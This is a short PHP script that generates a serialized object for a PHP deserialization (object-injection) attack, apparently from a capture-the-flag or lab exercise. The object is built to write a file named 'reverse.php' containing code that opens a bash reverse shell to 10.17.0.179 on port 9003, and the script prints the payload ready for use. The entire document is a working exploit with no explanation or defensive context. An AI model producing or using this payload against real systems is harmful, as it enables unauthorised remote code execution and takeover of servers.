<?php
class FormSubmit{
        public $form_file = 'reverse.php';
        public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.17.0.179/9003 0>&1\'");';
}
$obj = new FormSubmit();
echo serialize($obj);
?>
